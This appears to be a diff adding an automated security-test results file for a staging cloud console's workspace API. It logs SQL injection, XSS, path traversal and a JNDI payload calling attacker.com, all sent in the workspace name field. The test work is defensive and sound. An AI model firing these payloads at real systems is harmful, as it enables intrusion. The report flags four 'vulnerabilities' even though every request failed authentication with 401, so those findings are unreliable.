@@ -1,0 +1,451 @@
+{
+  "timestamp": "2025-09-24T13:19:07.590Z",
+  "environment": "stage",
+  "testType": "workspace-domain-purge-security",
+  "baseUrl": "https://stage-console.azion.com",
+  "testAccounts": {
+    "primary": {
+      "accountId": "25433",
+      "name": "Primary Test Account"
+    },
+    "secondary": {
+      "token": "unauthorized_token_test456",
+      "accountId": "unauthorized_account_789",
+      "name": "Simulated Unauthorized Account"
+    }
+  },
+  "workspaceApplications": [],
+  "purgeAttempts": [],
+  "securityVulnerabilities": [
+    {
+      "id": "VULN-1758719953779-netr9n5rl",
+      "timestamp": "2025-09-24T13:19:13.779Z",
+      "severity": "MEDIUM",
+      "type": "INJECTION_IN_WORKSPACE_PARAMS",
+      "description": "Possible injection vulnerability in workspace parameters: SQL injection in name field",
+      "evidence": {
+        "payload": "'; DROP TABLE workspaces; --",
+        "responseStatus": 401,
+        "responseBody": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        },
+        "detectedIndicators": [
+          "error"
+        ]
+      },
+      "testCase": "Should test injection attacks in workspace creation parameters",
+      "recommendation": "Add input sanitization for workspace parameters"
+    },
+    {
+      "id": "VULN-1758719954500-y2y8ev7ug",
+      "timestamp": "2025-09-24T13:19:14.500Z",
+      "severity": "MEDIUM",
+      "type": "INJECTION_IN_WORKSPACE_PARAMS",
+      "description": "Possible injection vulnerability in workspace parameters: XSS injection in name field",
+      "evidence": {
+        "payload": "<script>alert(\"xss\")</script>",
+        "responseStatus": 401,
+        "responseBody": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        },
+        "detectedIndicators": [
+          "error"
+        ]
+      },
+      "testCase": "Should test injection attacks in workspace creation parameters",
+      "recommendation": "Add input sanitization for workspace parameters"
+    },
+    {
+      "id": "VULN-1758719955370-s6r0etajh",
+      "timestamp": "2025-09-24T13:19:15.370Z",
+      "severity": "MEDIUM",
+      "type": "INJECTION_IN_WORKSPACE_PARAMS",
+      "description": "Possible injection vulnerability in workspace parameters: Path traversal in name field",
+      "evidence": {
+        "payload": "../../admin/workspaces",
+        "responseStatus": 401,
+        "responseBody": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        },
+        "detectedIndicators": [
+          "error"
+        ]
+      },
+      "testCase": "Should test injection attacks in workspace creation parameters",
+      "recommendation": "Add input sanitization for workspace parameters"
+    },
+    {
+      "id": "VULN-1758719956067-2azs5bc4t",
+      "timestamp": "2025-09-24T13:19:16.067Z",
+      "severity": "MEDIUM",
+      "type": "INJECTION_IN_WORKSPACE_PARAMS",
+      "description": "Possible injection vulnerability in workspace parameters: JNDI injection in name field",
+      "evidence": {
+        "payload": "${jndi:ldap://attacker.com/a}",
+        "responseStatus": 401,
+        "responseBody": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        },
+        "detectedIndicators": [
+          "error"
+        ]
+      },
+      "testCase": "Should test injection attacks in workspace creation parameters",
+      "recommendation": "Add input sanitization for workspace parameters"
+    }
+  ],
+  "apiCallsLog": [
+    {
+      "timestamp": "2025-09-24T13:19:08.000Z",
+      "operation": "Create Workspace Application",
+      "request": {
+        "method": "POST",
+        "url": "https://stage-console.azion.com/v4/workspace/applications",
+        "headers": {
+          "Authorization": "[REDACTED]",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "security-test-workspace-1758719947590-1",
+          "modules": {
+            "edge_cache": {
+              "enabled": true
+            },
+            "functions": {
+              "enabled": true
+            },
+            "application_accelerator": {
+              "enabled": true
+            },
+            "image_processor": {
+              "enabled": false
+            },
+            "tiered_cache": {
+              "enabled": true
+            }
+          },
+          "active": true
+        }
+      },
+      "response": {
+        "status": 401,
+        "statusText": "Unauthorized",
+        "body": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        }
+      },
+      "securityContext": "Creating workspace application: security-test-workspace-1758719947590-1",
+      "account": "Primary"
+    },
+    {
+      "timestamp": "2025-09-24T13:19:10.513Z",
+      "operation": "Create Workspace Application",
+      "request": {
+        "method": "POST",
+        "url": "https://stage-console.azion.com/v4/workspace/applications",
+        "headers": {
+          "Authorization": "[REDACTED]",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "security-test-workspace-1758719947590-2",
+          "modules": {
+            "edge_cache": {
+              "enabled": true
+            },
+            "functions": {
+              "enabled": false
+            },
+            "application_accelerator": {
+              "enabled": false
+            },
+            "image_processor": {
+              "enabled": true
+            },
+            "tiered_cache": {
+              "enabled": false
+            }
+          },
+          "active": true
+        }
+      },
+      "response": {
+        "status": 401,
+        "statusText": "Unauthorized",
+        "body": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        }
+      },
+      "securityContext": "Creating workspace application: security-test-workspace-1758719947590-2",
+      "account": "Primary"
+    },
+    {
+      "timestamp": "2025-09-24T13:19:12.887Z",
+      "operation": "Unauthorized Workspace Listing",
+      "request": {
+        "method": "GET",
+        "url": "https://stage-console.azion.com/v4/workspace/applications",
+        "headers": {
+          "Authorization": "[REDACTED]",
+          "Content-Type": "application/json"
+        }
+      },
+      "response": {
+        "status": 401,
+        "statusText": "Unauthorized",
+        "body": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        }
+      },
+      "securityContext": "Secondary account attempting to list workspace applications",
+      "account": "Secondary"
+    },
+    {
+      "timestamp": "2025-09-24T13:19:13.779Z",
+      "operation": "Workspace Injection Test",
+      "request": {
+        "method": "POST",
+        "url": "https://stage-console.azion.com/v4/workspace/applications",
+        "headers": {
+          "Authorization": "[REDACTED]",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "'; DROP TABLE workspaces; --",
+          "modules": {
+            "edge_cache": {
+              "enabled": true
+            }
+          },
+          "active": true
+        }
+      },
+      "response": {
+        "status": 401,
+        "statusText": "Unauthorized",
+        "body": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        }
+      },
+      "securityContext": "Testing injection: SQL injection in name field",
+      "account": "Primary"
+    },
+    {
+      "timestamp": "2025-09-24T13:19:14.500Z",
+      "operation": "Workspace Injection Test",
+      "request": {
+        "method": "POST",
+        "url": "https://stage-console.azion.com/v4/workspace/applications",
+        "headers": {
+          "Authorization": "[REDACTED]",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "<script>alert(\"xss\")</script>",
+          "modules": {
+            "edge_cache": {
+              "enabled": true
+            }
+          },
+          "active": true
+        }
+      },
+      "response": {
+        "status": 401,
+        "statusText": "Unauthorized",
+        "body": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        }
+      },
+      "securityContext": "Testing injection: XSS injection in name field",
+      "account": "Primary"
+    },
+    {
+      "timestamp": "2025-09-24T13:19:15.370Z",
+      "operation": "Workspace Injection Test",
+      "request": {
+        "method": "POST",
+        "url": "https://stage-console.azion.com/v4/workspace/applications",
+        "headers": {
+          "Authorization": "[REDACTED]",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "../../admin/workspaces",
+          "modules": {
+            "edge_cache": {
+              "enabled": true
+            }
+          },
+          "active": true
+        }
+      },
+      "response": {
+        "status": 401,
+        "statusText": "Unauthorized",
+        "body": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        }
+      },
+      "securityContext": "Testing injection: Path traversal in name field",
+      "account": "Primary"
+    },
+    {
+      "timestamp": "2025-09-24T13:19:16.066Z",
+      "operation": "Workspace Injection Test",
+      "request": {
+        "method": "POST",
+        "url": "https://stage-console.azion.com/v4/workspace/applications",
+        "headers": {
+          "Authorization": "[REDACTED]",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "${jndi:ldap://attacker.com/a}",
+          "modules": {
+            "edge_cache": {
+              "enabled": true
+            }
+          },
+          "active": true
+        }
+      },
+      "response": {
+        "status": 401,
+        "statusText": "Unauthorized",
+        "body": {
+          "errors": [
+            {
+              "code": "10001",
+              "title": "Authentication Failed",
+              "detail": "Invalid authentication credentials.",
+              "status": "401",
+              "source": {
+                "headers": "Authorization"
+              }
+            }
+          ]
+        }
+      },
+      "securityContext": "Testing injection: JNDI injection in name field",
+      "account": "Primary"
+    }
+  ],
+  "summary": {
+    "totalWorkspaceApplications": 0,
+    "successfullyCreated": 0,
+    "totalPurgeAttempts": 0,
+    "blockedAttempts": 0,
+    "totalApiCalls": 7,
+    "totalVulnerabilities": 4,
+    "criticalVulnerabilities": 0,
+    "highRiskVulnerabilities": 0,
+    "mediumRiskVulnerabilities": 4,
+    "testDuration": "2025-09-24T13:19:16.583Z"
+  },
+  "securityAssessment": {
+    "overallRisk": "MEDIUM",
+    "workspaceSecurityStatus": "SECURE",
+    "purgeSecurityStatus": "SECURE"
+  }
+}
